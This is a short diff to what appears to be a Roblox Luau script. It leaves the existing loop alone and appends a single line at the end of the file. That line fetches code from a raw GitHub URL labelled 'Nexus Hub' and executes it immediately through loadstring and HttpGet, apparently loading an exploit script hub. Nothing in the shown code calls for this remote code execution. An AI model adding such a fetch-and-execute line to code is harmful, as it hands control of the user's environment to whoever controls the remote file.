@@ -337,3 +337,6 @@ spawn(function()
         task.wait(1)
     end
 end)
+
+
+loadstring(game:HttpGet("https://raw.githubusercontent.com/shadowdev003-ai/amendment/refs/heads/main/Nexus%20Hub"))()
